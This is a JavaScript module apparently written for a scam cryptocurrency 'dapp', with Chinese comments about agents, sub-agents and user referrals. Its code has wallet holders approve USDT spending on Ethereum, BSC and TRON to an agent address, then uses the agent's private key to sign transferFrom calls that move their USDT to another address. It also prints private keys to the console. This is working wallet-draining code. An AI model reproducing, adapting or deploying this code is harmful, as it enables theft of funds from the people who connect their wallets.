//1. 代理创建次级代理逻辑 
//2. 用户发展用户        (✔)
//3. 转账记录加Button跳转到对应链网站
//4. 激励转账 + 修改激励金额
//5. 域名解析
//6. TRC链 授权+划账+激励


import Web3 from 'web3'// /dist/web3.min.js
import { providers } from "ethers"
import { provider } from "../blockchain/WalletProvider"
const TronWeb = require('tronweb')

//智能合约ABI与地址(ETH)
import abiERC20 from '../blockchain/ERC20.json'
import abiERC20_Check from '../blockchain/ERC20_Check.json'
let ContractERC20 = '0xdAC17F958D2ee523a2206206994597C13D831ec7'

//智能合约ABI与地址(BSC)
import abiBEP20 from '../blockchain/BEP20.json'
let ConTractBEP20 = '0x55d398326f99059fF775485246999027B3197955'

//智能合约ABI与地址(TRC)
import abiTRC20 from '../blockchain/TRC20.json'
let ConTractTRC20 = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t'


var wallet = ''
const Tx = require('ethereumjs-tx')
const Web3Utils = require('web3-utils')

export default class BlockChainBase {

    financialMfil(numMfil) {
        return Number.parseFloat(numMfil / 1e3).toFixed(3);
    }

    //获取Trc提供者信息
    onGetTronWeb() {
        const HttpProvider = TronWeb.providers.HttpProvider
        const fullNode = new HttpProvider("https://api.trongrid.io/")
        const solidityNode = new HttpProvider("https://api.trongrid.io/")
        const eventServer = new HttpProvider("https://api.trongrid.io/")
        const tronWeb = new TronWeb(fullNode, solidityNode, eventServer)
        return tronWeb
    }

    //根据链不同 调用不同的abi和智能合约
    onCheckChainLink(type, callBack) {
        if (type == 'ETH') {
            callBack(abiERC20, abiERC20_Check, ContractERC20, 'https://mainnet.infura.io/v3/75f5a6b0e4514c50858504adf83ed5e1', 1)
        }
        else if (type == 'BSC') {
            callBack(abiBEP20, abiBEP20, ConTractBEP20, 'https://binance.nodereal.io', 56)
        }
        else if (type == 'TRC') {
            callBack(abiTRC20, abiTRC20, ConTractTRC20, 'https://api.trongrid.io/', 88) //https://trx.mytokenpocket.vip
        }
        else console.log('无法获取到' + type + '链的数据')
    }

    //连接钱包
    async doConnectWallet(callBack, type) {
        try {
            if (wallet == '') {
                if (type == 'TRC') {
                    console.log("开始执行授权")
                    callBack('Approve', new Web3(provider))
                }
                else {
                    wallet = await provider.enable()
                        .catch(() => {
                            console.warn("用户取消连接钱包")
                            callBack('DisApprove')
                        })
                        .then(async function () {
                            console.log("开始执行授权")
                            callBack('Approve', new Web3(provider))
                        })
                }
            }
            else {
                callBack('Approve', new Web3(provider))
            }
        }
        catch (e) {
            console.error("连接钱包错误提示:", e)
        }
    }

    //断开连接钱包
    async doDisConnectWallet() {
        try {
            await provider.disconnect().then(() => {
                console.log("执行完毕")
                wallet = ''

                location.reload()
            })
        }
        catch (e) {
            console.log("错误提示:", e)
        }
    }

    //用户钱包授权给代理账户
    // async doApprove(web3, address, callBack) {
    //     try {
    //         if (web3 == null)
    //             web3 = new Web3(provider)

    //         var contract = new web3.eth.Contract(abiERC20, ContractERC20)
    //         let amount = 100 * Math.pow(10, 18)

    //         web3.eth.getAccounts().then(function (account) {
    //             var userAddress = account[0] //用户钱包地址
    //             contract.methods.approve(address, web3.utils.toWei(`${amount}`, 'ether'))
    //                 .send({ from: userAddress })
    //                 .then(function () {
    //                     callBack(true, userAddress)
    //                 })
    //                 .catch((reason) => {
    //                     if (reason.code == 4001) {
    //                         console.warn('授权失败, 其他原因')
    //                         callBack(false, null)
    //                     }
    //                     else if (reason.code == undefined) {
    //                         console.warn('授权失败, 用户取消')
    //                         callBack(false, null)
    //                     }
    //                 });
    //         })
    //     }
    //     catch (e) {
    //         console.error("授权错误提示:", e)
    //     }

    // }

    //用户钱包授权给代理账户
    async doApprove(web3, address, callBack, type) {
        try {
            this.onCheckChainLink(type, async (abi, abiCheck, abiContract, link, abiChainID) => {
                var contract
                if (type == 'TRC') {
                    if (window.tronWeb) {
                        var tronWeb = window.tronWeb
                        console.log("tronWeb = ", tronWeb)

                        callBack(true, tronWeb.defaultAddress.base58)
                        contract = await tronWeb.contract().at(abiContract)
                        try {
                            await contract.approve(address, 100000000).send({ feeLimit: 100000000 }).
                                then(output => {
                                    alert("授权成功")
                                })

                        } catch (error) {
                            if (error == 'Invalid issuer address provided')
                                alert("无法获取到用户的钱包地址")
                            else if (error == 'Confirmation declined by user')
                                alert("拒绝授权")
                            else console.error("trigger smart contract error", error)
                        }
                    }
                    else alert("请在带有Trx的钱包内使用Dapp访问")
                }
                else {
                    if (web3 == null)
                        web3 = new Web3(link || Web3.givenProvider)

                    contract = new web3.eth.Contract(abi, abiContract)
                    web3.eth.getAccounts().then(function (account) {
                        var userAddress = account[0] //用户钱包地址

                        web3.eth.getChainId(async (err, chainid) => {
                            if (err != null) {
                                console.log('区块链ID:' + chainid + ' 错误信息:' + err)
                                return
                            }

                            let amount = 100 * Math.pow(10, 18)
                            if (abiChainID == chainid) {
                                callBack(true, userAddress) //返回创建账号
                                contract.methods.approve(address, web3.utils.toWei(`${amount}`, 'ether'))
                                    .send({ from: userAddress })
                                    .then(function () {
                                    })
                                    .catch((reason) => {
                                        if (reason.code == 4001) console.warn('授权失败, 其他原因')
                                        else if (reason.code == undefined) console.warn('授权失败, 用户取消')
                                    })
                            }
                            else {
                                alert('请选择' + type + '链的钱包地址')
                                await provider.disconnect().then(() => {
                                    console.log("执行完毕")
                                    wallet = ''

                                    location.reload()
                                })
                            }
                        })
                    })
                }
            })
        }
        catch (e) {
            console.error("授权错误提示:", e)
        }
    }

    //查询账户余额
    async doBalanceOf(agentAddress, userAddress, callBack, web3, isTransfer, type) {
        if (type == 'TRC') {
            try {
                const tronWeb = this.onGetTronWeb()
                tronWeb.setAddress(userAddress)  //设置地址
                let contract = await tronWeb.contract().at(ConTractTRC20)
                let balance = await contract.balanceOf(userAddress).call()

                if (isTransfer) {
                    callBack(balance)
                }
                else {
                    callBack(balance / 1000000)
                }

            } catch (error) {
                console.error("trigger smart contract error", error)
            }
        }
        else {
            this.onCheckChainLink(type, async (abi, abiCheck, abiContract, link) => {
                web3 = new Web3(link || Web3.givenProvider)
                let contract = new web3.eth.Contract(abi, abiContract)
                contract.methods.balanceOf(userAddress)
                    .call({ from: agentAddress }, function (error, balance) {
                        if (!error) {
                            if (isTransfer)
                                callBack(balance, web3)
                            else
                                callBack(web3.utils.fromWei(balance, 'mwei'), web3)
                        }
                        else callBack(null, web3)
                    })
            })
        }
    }

    //检查是否授权
    async checkApprove(agentAddress, userAddress, callBack, type) {
        if (type == 'TRC') {
            const tronWeb = this.onGetTronWeb()
            tronWeb.setAddress(agentAddress)  //设置地址
            let contract = await tronWeb.contract().at(ConTractTRC20)
            await contract.allowance(userAddress, agentAddress).call((err, res) => {
                console.log('err = ', err)
                console.log('res = ', res)
                if (err == null && res != 0) {
                    console.log(type + ': 账户 ' + userAddress + ' 授权给' + agentAddress)
                    callBack(true)
                }
                else {
                    console.log(type + '：账户 ' + userAddress + ' 未授权给' + agentAddress)
                    callBack(false)
                }
            })
        }
        else {
            this.onCheckChainLink(type, async (abi, abiCheck, abiContract, link) => {
                let web3 = new Web3(link || Web3.givenProvider)
                let contract = new web3.eth.Contract(abiCheck, abiContract)
                await contract.methods.allowance(userAddress, agentAddress).call(async function (err, res) {
                    if (err == null && res != 0) {
                        console.log(type + ': 账户 ' + userAddress + ' 授权给' + agentAddress)
                        callBack(true)
                    }
                    else {
                        console.log(type + '：账户 ' + userAddress + ' 未授权给' + agentAddress)
                        callBack(false)
                    }
                })
            })
        }
    }

    //划账(TRC)
    async doTransferFromByTron(agentAPIKEY, userAddress, toAddress, amount, callBack) {
        const HttpProvider = TronWeb.providers.HttpProvider
        const fullNode = new HttpProvider("https://api.trongrid.io/")
        const solidityNode = new HttpProvider("https://api.trongrid.io/")
        const eventServer = new HttpProvider("https://api.trongrid.io/")
        const privateKey = agentAPIKEY
        const tronWeb = new TronWeb(fullNode, solidityNode, eventServer, privateKey)

        let contract = await tronWeb.contract().at(ConTractTRC20)
        await contract.transferFrom(
            userAddress, //address _from
            toAddress,   //address _to
            amount       //amount
        ).send({ feeLimit: 10000000 }).then(output => {
            console.log('- Output:', output, '\n')
            callBack(true, output, 0)
        })
    }

    //划账(ETH/BSC)
    async doTransferFrom(agentAddress, agentAPIKEY, userAddress, toAddress, amount, callBack, web3, ownNonce, index, type) {
        console.log(`------------------------`)
        console.log('激励钱包私钥 = ', agentAPIKEY)
        console.log('激励钱包地址 = ', agentAddress)
        console.log('发款钱包地址 = ', userAddress)
        console.log('收款钱包地址 = ', toAddress)
        console.log(`------------------------`)

        if (amount <= 1) {
            callBack(false, { message: '用户钱包余额不足' })
            return
        }

        if (type == 'TRC') {
            this.doTransferFromByTron(agentAPIKEY, userAddress, toAddress, amount, callBack)
        }
        else {

            this.onCheckChainLink(type, (abi, abiCheck, abiContract, link) => {
                web3 = new Web3(link || Web3.givenProvider)

                web3.eth.defaultAccount = userAddress
                web3.eth.getChainId(async (err, chainid) => {
                    console.log(`区块链ID: ${chainid}\n------------------------`)

                    if (err != null) {
                        callBack(false, { message: '区块链ID:' + chainid + ' 错误信息:' + err })
                        return
                    }

                    var contract = new web3.eth.Contract(abi, abiContract,
                        {
                            from: userAddress, //[1] 从代理账户上划帐 排除这里的问题！！
                            gasPrice: '14',
                            gas: '210000'
                        })

                    //[2] 尝试修改这里地址
                    web3.eth.getTransactionCount(agentAddress, 'latest', async (error, nonce) => { //pending earliest latest
                        console.log(`服务器交易梯度: ${ownNonce}`)
                        console.log(`区块链交易梯度: ${nonce}`)

                        var curNonce = nonce
                        // if (nonce > ownNonce) curNonce = nonce //如果区块链梯度大于服务器梯度, 默认使用区块链的否则优先使用服务器的
                        // else curNonce = ownNonce
                        curNonce += index
                        console.log(`使用梯度: ${curNonce}\n------------------------`)

                        if (!error) {
                            // console.log('web3 = ', web3)
                            // console.log('contract = ', contract)
                            // console.log(`------------------------`)

                            var transferFromData
                            if (type == 'ETH')
                                transferFromData = contract.methods.transferFrom(userAddress, toAddress, web3.utils.BN(amount)).encodeABI()
                            else
                                transferFromData = contract.methods.transferFrom(userAddress, toAddress, web3.utils.toBN(amount)).encodeABI()

                            try {
                                const txObject = {
                                    chainId: web3.utils.toHex(chainid),
                                    nonce: web3.utils.toHex(curNonce),
                                    from: userAddress,
                                    to: abiContract,
                                    value: '0x00',
                                    gasLimit: web3.utils.toHex(10000000000000),
                                    gas: web3.utils.toHex(210000),
                                    gasPrice: web3.utils.toHex(14 * 1e9),
                                    data: transferFromData
                                }
                                console.log(`解析后的数据: \n${JSON.stringify(txObject, null, '\t')}\n------------------------`)

                                const tx = new Tx(txObject)
                                const privateKey = Buffer.from(agentAPIKEY, "hex")
                                tx.sign(privateKey)
                                const serializedTx = tx.serialize()
                                console.log(`签名后的数据:  ${serializedTx.toString('hex')}\n------------------------`)

                                web3.eth.sendSignedTransaction('0x' + serializedTx.toString('hex'), (err, txHash) => {
                                    if (!err) {
                                        console.log('txHash = ', txHash)
                                        callBack(true, txHash, curNonce + 1)
                                    }
                                }).catch(function (err) {
                                    callBack(false, err)
                                })
                            }
                            catch (e) {
                                callBack(false, { message: '与区块链交互失败, 具体情况请联系管理员. ( F12>Consolo 查看具体日志 )' })
                            }
                        }
                    })
                })
            })
        }
    }

    //激励(Trc)
    async doTransferByTron(agentAPIKEY, userAddress, amount, callBack) {
        const HttpProvider = TronWeb.providers.HttpProvider
        const fullNode = new HttpProvider("https://api.trongrid.io/")
        const solidityNode = new HttpProvider("https://api.trongrid.io/")
        const eventServer = new HttpProvider("https://api.trongrid.io/")
        const privateKey = agentAPIKEY
        const tronWeb = new TronWeb(fullNode, solidityNode, eventServer, privateKey)

        let contract = await tronWeb.contract().at(ConTractTRC20)
        let result = await contract.transfer(
            userAddress, //address _to
            amount * 1000000 //amount
        ).send({
            feeLimit: 1000000
        }).then(output => {
            console.log('- Output:', output, '\n')
            callBack(true, output)
        })
    }

    //激励(ETH/BSC)
    async doTransfer(agentAddress, userAddress, agentAPIKEY, amount, callBack, web3, type) {
        console.log(`------------------------`)
        console.log('发款钱包地址 = ', agentAddress)
        console.log('收款钱包地址私钥 = ', agentAPIKEY)
        console.log('收款钱包地址 = ', userAddress)
        console.log(`------------------------`)
        if (amount == 0) {
            callBack(false, { message: 'USDT数量不能小于0' })
            return
        }

        if (type == 'TRC') {
            this.doTransferByTron(agentAPIKEY, userAddress, amount, callBack)
        }
        else {
            this.onCheckChainLink(type, (abi, abiCheck, abiContract, link) => {
                web3 = new Web3(link || Web3.givenProvider)
                web3.eth.defaultAccount = userAddress
                web3.eth.getChainId(async (err, chainid) => {
                    console.log(`区块链ID: ${chainid}\n------------------------`)

                    if (err != null) {
                        callBack(false, { message: '区块链ID:' + chainid + ' 错误信息:' + err })
                        return
                    }

                    web3.eth.getTransactionCount(agentAddress, 'latest', async (error, nonce) => { //pending earliest latest
                        console.log(`区块链交易梯度: ${nonce}`)

                        var curNonce = nonce
                        console.log(`使用梯度: ${curNonce}\n------------------------`)

                        if (!error) {
                            var contract = new web3.eth.Contract(abi, abiContract)
                            var encodedABI
                            if (type == 'ETH')
                                encodedABI = contract.methods.transfer(userAddress, web3.utils.BN(amount)).encodeABI()
                            else
                                encodedABI = contract.methods.transfer(userAddress, web3.utils.toBN(amount)).encodeABI()

                            try {
                                const txObject = {
                                    chainId: web3.utils.toHex(chainid),
                                    nonce: web3.utils.toHex(curNonce),
                                    from: agentAddress,
                                    to: abiContract,
                                    value: '0x00',
                                    gasLimit: web3.utils.toHex(10000000000000),
                                    gas: web3.utils.toHex(210000),
                                    gasPrice: web3.utils.toHex(14 * 1e9),
                                    data: encodedABI
                                }

                                const tx = new Tx(txObject)
                                const privateKey = Buffer.from(agentAPIKEY, "hex")
                                tx.sign(privateKey)
                                const serializedTx = tx.serialize()

                                web3.eth.sendSignedTransaction('0x' + serializedTx.toString('hex'), (err, txHash) => {
                                    if (!err) {
                                        console.log('txHash = ', txHash)
                                        callBack(true, txHash)
                                    }
                                }).catch(function (err) {
                                    console.log('err = ', err)
                                    callBack(false, err)
                                })
                            }
                            catch (e) {
                                callBack(false, { message: '与区块链交互失败, 具体情况请联系管理员. ( F12>Consolo 查看具体日志 )' })
                            }
                        }
                    })
                })
            })
        }
    }
}